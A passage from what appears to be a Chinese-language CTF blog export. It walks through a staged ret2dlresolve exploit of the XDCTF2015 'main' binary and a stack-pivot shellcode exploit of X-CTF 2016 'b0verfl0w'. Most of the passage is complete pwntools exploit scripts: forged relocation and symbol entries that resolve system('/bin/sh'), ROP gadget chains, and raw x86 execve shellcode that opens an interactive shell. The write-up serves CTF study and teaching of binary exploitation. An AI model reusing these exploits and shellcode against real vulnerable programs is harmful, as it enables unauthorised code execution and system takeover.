class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span> <span class=\"comment\"># objdump -d -j .plt main</span></span><br><span class=\"line\">index_offset = <span class=\"number\">0x20</span> <span class=\"comment\"># write&#x27;s index</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += p32(<span class=\"built_in\">len</span>(cmd))</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/20/ZpWxBQDsMwYjGSl.png\" alt=\"屏幕截图 2021-10-20 170358.png\"></p>\n<p>payload2 = p32(plt_0) + p32(index_offset)：利用dl_runtime_resolve 函数的原理找到write函数</p>\n<h2 id=\"stage3\"><a href=\"#stage3\" class=\"headerlink\" title=\"stage3\"></a>stage3</h2><p>同样控制 dl_resolve 函数中的 reloc_index 参数，不过这次控制其指向我们伪造的 write 重定位项</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span> <span class=\"comment\"># objdump -d -j .plt main</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x08048330</span> <span class=\"comment\"># objdump -s -j .rel.plt main</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt <span class=\"comment\"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = <span class=\"number\">0x607</span> <span class=\"comment\"># write: Elf32_Rel-&gt;r_info</span></span><br><span class=\"line\">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += p32(<span class=\"built_in\">len</span>(cmd))</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">28</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += fake_reloc <span class=\"comment\"># (base_stage+28)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/20/5JS1GCKgkpABuaW.png\" alt=\"屏幕截图 2021-10-20 175654.png\"></p>\n<p>红色区域是我们伪造的：</p>\n<p><img src=\"https://i.loli.net/2021/10/21/dZAzhQrnvs1Xj4V.png\" alt=\"image.png\"></p>\n<h2 id=\"stage4\"><a href=\"#stage4\" class=\"headerlink\" title=\"stage4\"></a>stage4</h2><p>这一次构造fake_sym，使其指向我们控制的st_name。伪造.dynsym的地址fake_sym_addr，通过fake_sym_addr计算出伪造r_info。</p>\n<p>所以payload2运行过程如下：先跳转到公共plt[0]，plt[0]会跳转到地址.dynamic，.dynamic 可以找到.rel.plt ，.rel.plt 的地址加上伪造数据index_offset 可以得到函数重定位表项伪造 的fake_reloc指针，指针中r_info&gt;&gt;8作为.dynsym下标找到name_offset，name_offset加上.dynstr找到write函数名，最后找到对应函数地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x08048330</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481d8</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x08048278</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>) <span class=\"comment\"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span> <span class=\"comment\"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span> <span class=\"comment\"># 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数</span></span><br><span class=\"line\">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class=\"line\">name_offset = <span class=\"number\">0x4c</span> </span><br><span class=\"line\">fake_sym = p32(name_offset) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += p32(<span class=\"built_in\">len</span>(cmd))</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">28</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += fake_reloc <span class=\"comment\"># (base_stage+28)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;B&#x27;</span> * align</span><br><span class=\"line\">payload2 += fake_sym <span class=\"comment\"># (base_stage+36)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/21/v5wLUFayZRMO79Q.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span> <span class=\"comment\"># 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数</span></span><br><span class=\"line\">fake_sym = p32(name_offset) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)  <span class=\"comment\"># name_offset=4c</span></span><br></pre></td></tr></table></figure>\n\n<p>这两行代码就是模拟寻找name_offset。原来的流程是r_info&gt;&gt;8作为下标找到.dynsym对应的内容，而这两行代码也是一样，通过假的r_info&gt;&gt;8找到的地址就是我们已经构造的地方，因为由前面可以知道原来的流程是r_info&gt;&gt;8作为下标是6（原来的r_info=0x607），所以fake_sym伪造成第六行即可</p>\n<p><img src=\"https://i.loli.net/2021/10/24/pfn5x8EUcHJrdLq.png\" alt=\"image.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/24/LsKVJZSdBuD51Xn.png\" alt=\"image.png\"></p>\n<h2 id=\"stage5\"><a href=\"#stage5\" class=\"headerlink\" title=\"stage5\"></a>stage5</h2><p>把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x08048330</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481d8</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x08048278</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>)</span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class=\"line\">st_name = (fake_sym_addr + <span class=\"number\">0x10</span>) - dynstr <span class=\"comment\"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class=\"line\">fake_sym = p32(st_name) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += p32(<span class=\"built_in\">len</span>(cmd))</span><br><span class=\"line\">payload2 += fake_reloc <span class=\"comment\"># (base_stage+28)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;B&#x27;</span> * align</span><br><span class=\"line\">payload2 += fake_sym <span class=\"comment\"># (base_stage+36)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;write\\x00&quot;</span>  <span class=\"comment\"># st_name对应的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"stage6\"><a href=\"#stage6\" class=\"headerlink\" title=\"stage6\"></a>stage6</h2><p>替换<code>write</code>为<code>system</code>，并修改<code>system</code>的参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x08048330</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481d8</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x08048278</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>)</span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class=\"line\">st_name = (fake_sym_addr + <span class=\"number\">0x10</span>) - dynstr</span><br><span class=\"line\">fake_sym = p32(st_name) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">payload2 += fake_reloc <span class=\"comment\"># (base_stage+28)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;B&#x27;</span> * align</span><br><span class=\"line\">payload2 += fake_sym <span class=\"comment\"># (base_stage+36)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;system\\x00&quot;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-6\"><a href=\"#EXP-6\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ppp_ret = <span class=\"number\">0x08048619</span> <span class=\"comment\"># ROPgadget --binary main --only &quot;pop|ret&quot;</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x0804861b</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048458</span> <span class=\"comment\"># ROPgadget --binary main --only &quot;leave|ret&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a040</span> <span class=\"comment\"># readelf -Smain | grep &quot;.bss&quot;</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * offset</span><br><span class=\"line\">payload += p32(read_plt)</span><br><span class=\"line\">payload += p32(ppp_ret)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(<span class=\"number\">100</span>)</span><br><span class=\"line\">payload += p32(pop_ebp_ret)</span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(leave_ret)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span> <span class=\"comment\"># objdump -d -j .plt main</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x08048330</span> <span class=\"comment\"># objdump -s -j .rel.plt main</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt <span class=\"comment\"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481d8</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x08048278</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>)</span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class=\"line\">st_name = (fake_sym_addr + <span class=\"number\">16</span>) - dynstr</span><br><span class=\"line\">fake_sym = p32(st_name) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">payload2 += fake_reloc <span class=\"comment\"># (base_stage+28)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;B&#x27;</span> * align</span><br><span class=\"line\">payload2 += fake_sym <span class=\"comment\"># (base_stage+36)的位置</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;system\\x00&quot;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"X-CTF-Quals-2016-b0verfl0w\"><a href=\"#X-CTF-Quals-2016-b0verfl0w\" class=\"headerlink\" title=\"X-CTF Quals 2016 - b0verfl0w\"></a>X-CTF Quals 2016 - b0verfl0w</h1><p>还是栈溢出，不过这次除了libc泄露还可以采取stack pivoting，就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。</p>\n<p><img src=\"https://i.loli.net/2021/10/29/ahAs8u651olBGy3.png\" alt=\"image.png\"></p>\n<p>没有开堆栈不可执行，所以可以采取stack pivoting，将ROP写入在栈中，控制eip执行堆栈中的ROP。</p>\n<p><img src=\"https://i.loli.net/2021/10/29/6NRHrxjc3d9iD2e.png\" alt=\"image.png\"></p>\n<p>查找gadgets，发现存在jmp esp，所以可以让eip执行堆栈中的内容。</p>\n<p>编写shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode_x86 = <span class=\"string\">&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;</span></span><br><span class=\"line\">sub_esp_jmp = asm(<span class=\"string\">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>计算偏移。fgets只允许读取50个字节，s总共能存储0x20个字节，也就是溢出50-0x20-4=14字节</p>\n<p><img src=\"https://i.loli.net/2021/10/29/dYoqVX5sycF4i2G.png\" alt=\"image.png\"></p>\n<p>最后编写exp</p>\n<h2 id=\"EXP-7\"><a href=\"#EXP-7\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode_x86 = <span class=\"string\">&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x0b\\xcd\\x80&quot;</span></span><br><span class=\"line\">jmp_esp = <span class=\"number\">0x08048504</span></span><br><span class=\"line\">sub_esp_jmp = asm(<span class=\"string\">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class=\"line\">payload = shellcode_x86+<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x20</span>-<span class=\"built_in\">len</span>(shellcode_x86))+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 